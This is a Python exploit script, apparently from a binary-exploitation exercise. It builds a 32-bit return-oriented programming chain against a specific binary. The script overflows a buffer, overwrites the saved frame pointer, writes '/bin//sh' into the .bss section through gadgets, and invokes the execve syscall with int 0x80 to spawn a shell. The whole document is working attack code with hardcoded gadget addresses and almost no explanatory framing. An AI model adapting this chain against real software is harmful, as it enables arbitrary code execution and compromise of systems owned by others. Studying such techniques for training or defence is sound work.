#!/usr/bin/env python
import sys, struct
def address(data):
    return struct.pack("<I", data)

pop_eax = 0x80bb0a6+4
pop_ebx = 0x80481a9
pop_ecx_pop_ebx = 0x806e361
pop_edx = 0x806e33a
zero_eax = 0x8053d40
writewhatwhere = 0x805acfa # : mov eax,edx ; ret
execute_syscall = 0x806e9d0 # : int 0x80
add_b_to_eax = 0x808e252 # add eax,0xb; pop edi; ret
# why is this not changing? ASLR is on
#shell=0xf7f540cf

# find the right section? __malloc
writable_memory=0x08058c40 + 0 # .bss section is writable
padding = " "              # we'll use spaces as padding
text = "A shell\n\n\n"     # Flavor text
EBPoverwrite = "AAAA" # Bytes to overwrite EBP

buffer = text + padding * (32 - len(text) )
buffer += EBPoverwrite

# string1
buffer += address(pop_eax) # place value into EAX
buffer += "/bin"           # 4 bytes at a time
buffer += address(pop_edx)         # place value into edx
buffer += address(writable_memory)
buffer += address(writewhatwhere)

#string2
buffer += address(pop_eax)
buffer += "//sh"
buffer += address(pop_edx)
buffer += address(writable_memory + 4)
buffer += address(writewhatwhere)

# string address
buffer += address(pop_eax)
buffer += address(writable_memory)
buffer += address(pop_edx)
buffer += address(writable_memory + 12)
buffer += address(writewhatwhere)

# assume .bss was zero so we don't need to zero terminate string

# zero argument edx
buffer += address(zero_eax)
buffer += address(writewhatwhere)

#buffer += address(pop_eax)
#buffer += address(shell)
#buffer += address(pop_edx)
#buffer += address(writable_memory + 0)
#buffer += address(writewhatwhere)

buffer += address(zero_eax)
buffer += address(add_b_to_eax)
buffer += address(0xdeadbeef) # dummy word to satify pop-side effect

buffer += address(pop_ecx_pop_ebx)
buffer += address(writable_memory + 12) # address of pointer to /bin/sh
buffer += address(writable_memory)      # location of string /bin/sh

buffer += address(execute_syscall)
print(buffer)
